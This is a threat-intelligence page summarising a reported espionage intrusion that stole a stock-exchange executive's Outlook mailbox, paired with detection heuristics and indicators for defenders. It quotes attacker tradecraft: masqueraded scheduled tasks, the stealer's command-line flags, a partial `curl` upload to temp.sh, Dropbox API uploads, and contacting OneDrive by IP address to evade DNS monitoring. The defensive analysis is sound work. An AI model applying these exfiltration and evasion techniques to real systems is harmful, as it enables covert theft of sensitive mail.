# Stock exchange executive mailbox espionage

## Summary
Broadcom / Symantec reported a five-month targeted espionage intrusion against a senior executive at a major global stock exchange. The public writeup describes an unidentified actor focused on one objective: incremental theft of the executive's Outlook mailbox from a compromised Windows host.

The attackers used masquerading service binaries, scheduled tasks, an Aspose-based OST-to-PST mailbox stealer, Dropbox API uploads, OneDrive Personal uploads through hard-coded Microsoft IP addresses, and short-lived testing of `temp.sh` as an exfiltration channel. Broadcom says the tooling and cloud-service use left too few clues for attribution to a known group, but the target selection and command activity point to espionage motivation.

## Tags
- ops
- operations
- espionage
- mailbox theft
- Outlook
- financial sector
- stock exchange
- scheduled tasks
- Dropbox
- OneDrive
- cloud service abuse
- credential theft
- persistence
- living off the land

## Why this matters
- A senior executive mailbox can expose negotiations, listings, enforcement activity, calendars, travel patterns, contacts, and other market-sensitive or governance-sensitive material without requiring broad network-wide data theft.
- The operation shows a low-noise model: repeated small extraction windows over months, not one large smash-and-grab archive.
- Dropbox and OneDrive Personal traffic can blend into legitimate cloud-service use; the OneDrive path also used Microsoft IP addresses directly to avoid DNS signals for `onedrive.live.com`.
- The intrusion reinforces that endpoint telemetry, mailbox-file access, scheduled-task churn, and cloud-upload patterns need to be correlated for executive-protection monitoring.

## Reported intrusion shape

### Initial observed foothold
- Broadcom says the initial infection vector is unknown.
- The first observed malicious activity was on October 10, 2025, when the attackers already had SYSTEM-level masquerading binaries running under service-control-manager lineage.
- Named masquerades included:
  - `CSIDL_COMMON_APPDATA\adobe\arm\armsvc.exe`, imitating Adobe Acrobat Reader Update service paths.
  - `CSIDL_PROFILE\appdata\local\microsoft\onedrive\setup\oneservice.exe`, imitating OneDrive setup paths but in an abnormal location.
- Persistence for the Adobe-themed binary used a five-minute scheduled task named `\Microsoft\Windows\Adobe\ARM Service`.

### Scheduled-task control layer
- On November 12, 2025, the intrusion became more active.
- The attackers repeatedly registered or overwrote a scheduled task named `\Microsoft\Windows\Lenovo\CheckServerHealth`.
- The task masqueraded as Lenovo system-health checking and launched rotating batch files such as `c:\windows\temp\1.bat` through `5.bat`, redirecting output into matching `.txt` files.
- Task intervals changed over the campaign, including 300-minute, 900-minute, and 1440-minute schedules.
- On February 27, 2026, Broadcom observed another persistence anchor: `CSIDL_COMMON_APPDATA\microsoft onedrive\setup\onedrivesync.exe`, registered as `\Microsoft\Windows\MicrosoftOneDriveSyncServiceCore` on a three-minute schedule.

### Mailbox theft
- The main collection tool was an Aspose-based mailbox stealer.
- Aspose is a legitimate .NET library capable of parsing Outlook OST and PST files; the attackers wrapped it in a standalone executable that converted the target user's OST mailbox into PST output.
- The executable was renamed with temporary-looking filenames including `ts_9ea0.tmp`, `ts_e0d5.tmp`, and `ts_e2d5.tmp`; Broadcom says all three shared SHA-256 `db59813e3f27fb8608a4876e758f60b69d9700dc22d15237ac095bb3166fb622`.
- Command lines used:
  - `-p` for the OST password.
  - `-f` for the target Outlook OST file.
  - `-o` for the output directory.
  - `-t` for date-range windows.
- The first reported run collected mail from August 2025 through November 12, 2025; later runs used adjoining windows of recent days or weeks, producing near-continuous mailbox theft in smaller batches through February 17, 2026.

### Exfiltration channels
- The attackers completed a Dropbox OAuth handshake and reused one Dropbox application client ID / secret pair across observed uploads and downloads.
- Dropbox uploads used `curl` against `https://content.dropboxapi.com/2/files/upload`.
- From late November 2025, the actor added OneDrive Personal as a second exfiltration channel.
- Broadcom observed OneDrive API calls first against `onedrive.live.com`, then against hard-coded Microsoft IP addresses including `13.107.137.11` and `150.171.41.11`.
- Broadcom notes that those IPs belong to Microsoft-published address ranges and are used by OneDrive / CDN front ends; using IPs directly can bypass DNS-based logging and blocking for `onedrive.live.com`.
- The attackers briefly tested `temp.sh` via `curl -F file=@... https://temp.sh/upload -k` to `51.91.79.17:443`, but Broadcom says this channel was not used again after November 21.

### Later tooling
- On March 19, 2026, Broadcom observed `armdriver.exe` under `CSIDL_COMMON_APPDATA\adobe\arm\ondemand\`.
- The same stage installed `te.host.dll` under `CSIDL_COMMON_APPDATA\intel`; Broadcom notes the name could plausibly support side-loading against Microsoft Test Engine `te.exe`, but it did not observe execution of the parent `te.exe`.
- This was the last activity Broadcom observed on the victim host.

## Defender heuristics

### Executive endpoint and mailbox monitoring
- Treat unusual local access to Outlook OST/PST files on executive endpoints as high-signal, especially when followed by archive creation or cloud uploads.
- Hunt for command lines that convert or export mailbox files with date-window arguments or repeated incremental windows.
- Monitor for Aspose-based mailbox tooling or unsigned executables interacting with `AppData\Local\Microsoft\Outlook\`.
- Correlate executive endpoint alerts with mailbox audit logs; endpoint-only monitoring can miss the intelligence value of a single mailbox.

### Windows persistence and masquerading
- Alert on scheduled tasks under vendor-themed paths that run from `C:\Windows\Temp`, user profile paths, or `ProgramData`-style common app data instead of expected signed vendor install directories.
- Review recurring tasks named like health checks or update services when they run every few minutes or redirect output to temp files.
- Flag service or scheduled-task binaries using names such as `armsvc.exe`, `oneservice.exe`, or `onedrivesync.exe` outside legitimate Adobe / OneDrive locations.
- Investigate `CSIDL_COMMON_APPDATA\intel` or similar new vendor-themed staging directories that appear during an intrusion.

### Cloud-service exfiltration
- Monitor Dropbox API OAuth token exchanges and upload endpoints from hosts or user groups that do not normally use Dropbox.
- Do not rely only on DNS for OneDrive detection; inspect TLS SNI, HTTP host headers where available, endpoint process telemetry, and outbound `curl.exe` connections to Microsoft IP ranges when the process or command line is unusual.
- Alert on `curl.exe` uploads to cloud-storage APIs from executive endpoints, especially when the source files are recently generated archives or temp files.
- Treat short-lived testing of public file hosts such as `temp.sh` as possible exfiltration channel validation even if the actor later switches channels.

### Incident response
- Preserve scheduled-task XML, process-command telemetry, cloud-upload logs, mailbox-file timestamps, and endpoint artifacts before cleanup.
- Scope by mailbox access window, not just by the initial endpoint alert; repeated date-window exports can reveal how much mail was collected.
- Rotate exposed credentials only after isolating the host and preserving enough evidence to determine whether mailbox, cloud, or local secrets were also stolen.

## Selected indicators and pivots
- Scheduled task names:
  - `\Microsoft\Windows\Adobe\ARM Service`
  - `\Microsoft\Windows\Lenovo\CheckServerHealth`
  - `\Microsoft\Windows\MicrosoftOneDriveSyncServiceCore`
- Masquerade / staging paths:
  - `CSIDL_COMMON_APPDATA\adobe\arm\armsvc.exe`
  - `CSIDL_PROFILE\appdata\local\microsoft\onedrive\setup\oneservice.exe`
  - `CSIDL_COMMON_APPDATA\microsoft onedrive\setup\onedrivesync.exe`
  - `CSIDL_COMMON_APPDATA\adobe\arm\ondemand\armdriver.exe`
  - `CSIDL_COMMON_APPDATA\intel\te.host.dll`
- Mailbox stealer filenames: `ts_9ea0.tmp`, `ts_e0d5.tmp`, `ts_e2d5.tmp`.
- Mailbox stealer SHA-256: `db59813e3f27fb8608a4876e758f60b69d9700dc22d15237ac095bb3166fb622`.
- OneDrive IP pivots reported by Broadcom: `13.107.137.11`, `150.171.41.11`.
- Temporary file-hosting test: `51.91.79.17`, `https://temp.sh/upload`.

Use Broadcom's IOC table for the complete hash set, including SharpDecryptPwd, FRPC, BypassUAC, Secretsdump, `sidehost.exe`, `sepservice.exe`, `sddsvc.exe`, `armdriver.exe`, `te.host.dll`, `onedrivesync.exe`, and `oneservice.exe` samples.

## Related pages
- [Microsoft Midnight Blizzard mailbox theft from Microsoft](microsoft-midnight-blizzard-mailbox-theft-from-microsoft.md)
- [BlackFile / UNC6671 vishing extortion operation](blackfile-unc6671-vishing-extortion.md)
- [ROADtools Entra ID cloud-intrusion toolkit](../tools/roadtools.md)

## Sources
- [Broadcom / Symantec Threat Intelligence](https://www.security.com/threat-intelligence/stock-exchange-espionage)
